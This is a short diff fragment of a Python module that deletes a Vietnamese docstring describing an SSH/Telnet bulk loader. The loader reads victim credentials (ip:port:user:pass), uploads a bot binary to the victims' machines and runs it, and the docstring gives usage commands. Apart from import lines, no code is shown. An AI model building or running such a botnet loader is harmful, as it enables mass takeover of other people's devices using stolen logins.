@@ -1,14 +1,3 @@
-"""
-SSH/Telnet bulk loader — triển khai bot binary lên máy nạn nhân.
-
-Đọc file targets (ip:port:user:pass), kết nối SSH/Telnet, upload binary,
-execute, và báo cáo kết quả.
-
-Usage:
-    python -m server.loader --targets targets.txt --binary dist/client.aarch64
-    python -m server.loader --targets targets.txt --binary-dir dist/ --threads 20
-"""
-
 import argparse
 import base64
 import logging
